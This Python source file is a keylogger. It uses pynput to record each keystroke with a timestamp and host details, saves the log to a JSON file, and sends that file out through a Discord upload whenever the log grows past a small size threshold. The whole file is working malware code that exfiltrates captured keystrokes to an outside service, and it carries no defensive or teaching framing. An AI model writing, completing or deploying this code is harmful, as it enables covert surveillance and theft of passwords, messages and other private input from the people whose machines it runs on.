from pynput.keyboard import Listener, Key

from classes.Host import Host
from discord_util import discord
from utils.file_util import write_keys_to_file, get_object_size
from utils.time_util import get_current_date_and_time

key_log = {}

host = Host()

json_file = "json_key_log.txt"
legible_text_file = "legible_log.txt"

# discord file sending limit is 8MB, but we will use 5MB to be safe
discord_file_size_limit = 5


def should_send_file(key):
    object_size = get_object_size(key_log)
    if len(key_log) <= 2:
        return False
    return object_size >= 0.002 and (key == Key.enter or key == Key.space)


def on_press(key):
    time = get_current_date_and_time()
    key_log[time] = str(key).replace("'", "")

    print(get_object_size(key_log))
    # using this size for testing purposes
    if should_send_file(key):
        write_keys_to_file(key_log, json_file, host)
        discord.send_file(json_file, json_file)
        # TODO: then create method to convert json to legible text
        key_log.clear()


def log():
    with Listener(on_press=on_press, on_release=None) as listener:
        listener.join()
        # TODO: maybe add check to force send file if program is closed
        #  or if it has been running for a long time without any new keystrokes
